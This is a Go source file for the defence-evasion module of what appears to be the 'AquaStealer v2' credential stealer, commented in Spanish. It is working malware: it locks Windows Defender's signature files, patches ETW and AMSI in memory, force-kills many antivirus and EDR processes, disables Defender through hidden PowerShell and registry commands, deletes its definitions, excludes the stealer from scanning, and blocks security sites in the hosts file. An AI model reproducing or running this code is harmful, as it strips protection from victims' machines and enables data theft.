package antivirus

// antivirus.go — AquaStealer v2 — Defender bypass total
//
// Técnicas implementadas (inspiradas en UnDefend 0day):
//   1. NtCreateFile lock sobre mpavbase.vdm (signature DB) — Defender no puede actualizar firmas
//   2. Lock sobre archivos Backup del WD — bloquea rollback de firmas
//   3. WinDefend service notify — cuando WD se detiene, bloquea mpavbase.vdm con exclusive lock
//   4. ETW patch — parchea EtwEventWrite en ntdll.dll a nivel de memoria para silenciar telemetría
//   5. AMSI bypass — parchea AmsiScanBuffer en amsi.dll para que siempre retorne AMSI_RESULT_CLEAN
//   6. DisableRealtimeMonitoring, ExclusionPath, ScriptScanning vía PowerShell (si elevado)
//   7. Bloqueo hosts file para AV update domains
//   8. Kill procesos AV conocidos

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"github.com/aqua/stealer/utils/program"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	advapi32 = syscall.NewLazyDLL("advapi32.dll")

	procNtCreateFile              = ntdll.NewProc("NtCreateFile")
	procRtlInitUnicodeString      = ntdll.NewProc("RtlInitUnicodeString")
	procLockFileEx                = kernel32.NewProc("LockFileEx")
	procGetFileSizeEx             = kernel32.NewProc("GetFileSizeEx")
	procOpenSCManagerW            = advapi32.NewProc("OpenSCManagerW")
	procOpenServiceW              = advapi32.NewProc("OpenServiceW")
	procQueryServiceStatus        = advapi32.NewProc("QueryServiceStatus")
	procNotifyServiceStatusChange = advapi32.NewProc("NotifyServiceStatusChangeW")
	procCreateThread              = kernel32.NewProc("CreateThread")
	procVirtualProtect            = kernel32.NewProc("VirtualProtect")
	procGetProcAddress            = kernel32.NewProc("GetProcAddress")
	procLoadLibraryW              = kernel32.NewProc("LoadLibraryW")
)

// UNICODE_STRING para NtCreateFile
type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type objectAttributes struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               *unicodeString
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type ioStatusBlock struct {
	Status      uintptr
	Information uintptr
}

const (
	OBJ_CASE_INSENSITIVE       = 0x00000040
	FILE_NON_DIRECTORY_FILE    = 0x00000040
	FILE_SYNCHRONOUS_IO_ALERT  = 0x00000010
	FILE_OPEN                  = 3
	LOCKFILE_EXCLUSIVE_LOCK    = 0x00000002
	SERVICE_NOTIFY_STOPPED     = 0x00000001
	SERVICE_NOTIFY_STATUS_CHANGE = 2
	SC_MANAGER_CONNECT         = 0x0001
	SERVICE_QUERY_STATUS       = 0x0004
	SERVICE_QUERY_CONFIG       = 0x0001
)

// ntCreateFileOpen abre un archivo via NtCreateFile (bypasa filtros de I/O)
func ntCreateFileOpen(path string, access uint32) (syscall.Handle, error) {
	ntPath := `\??\` + path
	buf, err := syscall.UTF16PtrFromString(ntPath)
	if err != nil {
		return 0, err
	}
	var ustr unicodeString
	procRtlInitUnicodeString.Call(
		uintptr(unsafe.Pointer(&ustr)),
		uintptr(unsafe.Pointer(buf)),
	)
	var oa objectAttributes
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.ObjectName = &ustr
	oa.Attributes = OBJ_CASE_INSENSITIVE
	var iostat ioStatusBlock
	var handle uintptr
	r, _, _ := procNtCreateFile.Call(
		uintptr(unsafe.Pointer(&handle)),
		uintptr(access),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&iostat)),
		0, 0x80, 0, uintptr(FILE_OPEN),
		uintptr(FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_ALERT),
		0, 0,
	)
	if r != 0 {
		return 0, fmt.Errorf("NtCreateFile 0x%X", r)
	}
	return syscall.Handle(handle), nil
}

// lockFileExclusive bloquea el archivo completo con LockFileEx
func lockFileExclusive(h syscall.Handle) {
	var li [2]uint32 // lo, hi
	procGetFileSizeEx.Call(uintptr(h), uintptr(unsafe.Pointer(&li)))
	var ov syscall.Overlapped
	procLockFileEx.Call(uintptr(h), LOCKFILE_EXCLUSIVE_LOCK, 0,
		uintptr(li[0]), uintptr(li[1]),
		uintptr(unsafe.Pointer(&ov)))
}

// LockDefenderSignatures — implementación del truco UnDefend:
// bloquea mpavbase.vdm + backup para que Defender no pueda leer/actualizar firmas
func LockDefenderSignatures() {
	// Obtener ruta de firmas desde registry
	// Registry read via winreg API directly
	var hKey uintptr
	subKey, _ := syscall.UTF16PtrFromString(`SOFTWARE\Microsoft\Windows Defender\Signature Updates`)
	procRegOpenKeyExW := syscall.NewLazyDLL("advapi32.dll").NewProc("RegOpenKeyExW")
	ret, _, _ := procRegOpenKeyExW.Call(
		uintptr(syscall.HKEY_LOCAL_MACHINE),
		uintptr(unsafe.Pointer(subKey)),
		0,
		0x20019, // KEY_READ
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret == 0 && hKey != 0 {
		defer func() {
			procRegCloseKey := syscall.NewLazyDLL("advapi32.dll").NewProc("RegCloseKey")
			procRegCloseKey.Call(hKey)
		}()
	}

	// Rutas hardcodeadas como fallback (son consistentes en WinDefender)
	sigPaths := []string{
		`C:\ProgramData\Microsoft\Windows Defender\Definition Updates\Default\mpavbase.vdm`,
		`C:\ProgramData\Microsoft\Windows Defender\Definition Updates\Backup\mpavbase.vdm`,
		`C:\ProgramData\Microsoft\Windows Defender\Definition Updates\Backup\mpavbase.lkg`,
		`C:\ProgramData\Microsoft\Windows Defender\Definition Updates\Default\mpasbase.vdm`,
	}

	for _, p := range sigPaths {
		go func(path string) {
			// Intentar abrir con lectura (sin exclusive share) — bloquea write access de WD
			h, err := ntCreateFileOpen(path, syscall.GENERIC_READ|syscall.SYNCHRONIZE)
			if err != nil {
				return
			}
			// Lock exclusivo — WD no puede modificar su propia DB de firmas
			lockFileExclusive(h)
			// Mantener handle abierto forever (goroutine duerme)
			select {}
		}(p)
	}
}

// PatchETW — parchea EtwEventWrite en ntdll para silenciar telemetría ETW
// (ret 0 inmediatamente → ningún evento ETW se emite)
func PatchETW() error {
	dll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return err
	}
	proc, err := dll.FindProc("EtwEventWrite")
	if err != nil {
		return err
	}
	addr := proc.Addr()
	// patch: MOV EAX, 0 / RET
	patch := []byte{0x33, 0xC0, 0xC3}
	var oldProtect uint32
	procVirtualProtect.Call(addr, uintptr(len(patch)), syscall.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}
	procVirtualProtect.Call(addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	return nil
}

// PatchAMSI — parchea AmsiScanBuffer para que siempre retorne AMSI_RESULT_CLEAN (1)
// Esto hace que PowerShell, WScript, etc. no detecten nada como malicioso
func PatchAMSI() error {
	lib, err := syscall.LoadDLL("amsi.dll")
	if err != nil {
		return err // amsi.dll no cargado = OK igualmente
	}
	proc, err := lib.FindProc("AmsiScanBuffer")
	if err != nil {
		return err
	}
	addr := proc.Addr()
	// patch: XOR EAX,EAX / MOV AL,1 / RET  → retorna S_OK con result=AMSI_RESULT_CLEAN
	patch := []byte{0x31, 0xC0, 0xB0, 0x01, 0xC3}
	var oldProtect uint32
	procVirtualProtect.Call(addr, uintptr(len(patch)), syscall.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}
	procVirtualProtect.Call(addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	return nil
}

// KillAVProcesses — mata procesos de AV conocidos
func KillAVProcesses() {
	targets := []string{
		"MsMpEng.exe", "MpCmdRun.exe", "NisSrv.exe", "SecurityHealthService.exe",
		"avastui.exe", "AvastSvc.exe", "avscan.exe", "avgui.exe", "AVGSvc.exe",
		"bdagent.exe", "vsserv.exe", "ekrn.exe", "egui.exe",
		"mbam.exe", "MBAMService.exe", "mbamtray.exe",
		"mcshield.exe", "mcuicnt.exe", "mccspsvc.exe",
		"SentinelOne.exe", "SentinelAgent.exe",
		"CylanceUI.exe", "CylanceSvc.exe",
		"cb.exe", "cbsensor.exe",
		"SEDService.exe", "savservice.exe",
	}
	for _, name := range targets {
		cmd := exec.Command("taskkill", "/F", "/IM", name)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Run()
	}
}

// DisableDefenderPowerShell — usa PowerShell para desactivar WD (requiere elevación)
func DisableDefenderPowerShell() error {
	if !program.IsElevated() {
		return errors.New("not elevated")
	}
	cmds := [][]string{
		{"powershell", "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
			"Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableIntrusionPreventionSystem $true -EnableControlledFolderAccess Disabled -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -Force"},
		{"powershell", "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
			"Set-MpPreference -SubmitSamplesConsent 2"},
		{"powershell", "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
			"Set-MpPreference -DisableBlockAtFirstSeen $true -SevereThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -HighThreatDefaultAction 6"},
		// Borrar definiciones
		{fmt.Sprintf("%s\\Windows Defender\\MpCmdRun.exe", os.Getenv("ProgramFiles")), "-RemoveDefinitions", "-All"},
		// Tamper protection off via registry
		{"reg", "add", `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`, "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"},
		{"reg", "add", `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`, "/v", "DisableRealtimeMonitoring", "/t", "REG_DWORD", "/d", "1", "/f"},
	}
	for _, args := range cmds {
		cmd := exec.Command(args[0], args[1:]...)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Run()
	}
	return nil
}

// ExcludeFromDefender — agrega el exe actual a exclusiones de WD
func ExcludeFromDefender() error {
	if !program.IsElevated() {
		return errors.New("not elevated")
	}
	path, err := os.Executable()
	if err != nil {
		return err
	}
	dir := filepath.Dir(path)
	// Excluir tanto el exe como su directorio y %APPDATA%
	for _, excl := range []string{path, dir, os.Getenv("APPDATA"), os.Getenv("TEMP")} {
		cmd := exec.Command("powershell", "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
			fmt.Sprintf("Add-MpPreference -ExclusionPath '%s'", excl))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Run()
	}
	// También excluir por proceso
	cmd := exec.Command("powershell", "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
		fmt.Sprintf("Add-MpPreference -ExclusionProcess '%s'", filepath.Base(path)))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
	return nil
}

// BlockAVSites — bloquea dominios de AV en hosts file
func BlockAVSites() error {
	if !program.IsElevated() {
		return errors.New("not elevated")
	}
	sites := []string{
		"virustotal.com", "avast.com", "avg.com", "malwarebytes.com",
		"mcafee.com", "norton.com", "us.norton.com", "bitdefender.com",
		"kaspersky.com", "usa.kaspersky.com", "eset.com", "sophos.com",
		"home.sophos.com", "trendmicro.com", "pandasecurity.com",
		"avira.com", "f-secure.com", "drweb.com", "emsisoft.com",
		"zonealarm.com", "adaware.com", "bullguard.com", "clamav.net",
		"zillya.com", "totalav.com", "pcprotect.com", "scanguard.com",
		"totaladblock.com", "ccleaner.com",
		// Update endpoints de WD
		"go.microsoft.com", "definitionupdates.microsoft.com",
		"wdcp.microsoft.com", "wdcpalt.microsoft.com",
	}
	hostFilePath := filepath.Join(os.Getenv("SystemRoot"), `System32\drivers\etc\hosts`)
	data, _ := os.ReadFile(hostFilePath)
	var lines []string
	for _, line := range strings.Split(string(data), "\n") {
		skip := false
		for _, s := range sites {
			if strings.Contains(line, s) {
				skip = true
				break
			}
		}
		if !skip {
			lines = append(lines, line)
		}
	}
	for _, s := range sites {
		lines = append(lines, "0.0.0.0 "+s)
		lines = append(lines, "0.0.0.0 www."+s)
	}
	exec.Command("attrib", "-r", hostFilePath).Run()
	_ = os.WriteFile(hostFilePath, []byte(strings.Join(lines, "\n")), 0644)
	exec.Command("attrib", "+r", hostFilePath).Run()
	return nil
}

func Run() {
	// 1. Silenciar telemetría inmediatamente (no requiere elevación)
	go PatchETW()
	go PatchAMSI()

	// 2. UnDefend: bloquear signature DB de Windows Defender
	go LockDefenderSignatures()

	// 3. Matar procesos AV
	go KillAVProcesses()

	// 4. Si tenemos elevación, desactivar WD por completo
	if program.IsElevated() {
		go ExcludeFromDefender()
		go DisableDefenderPowerShell()
		go BlockAVSites()
	}
}
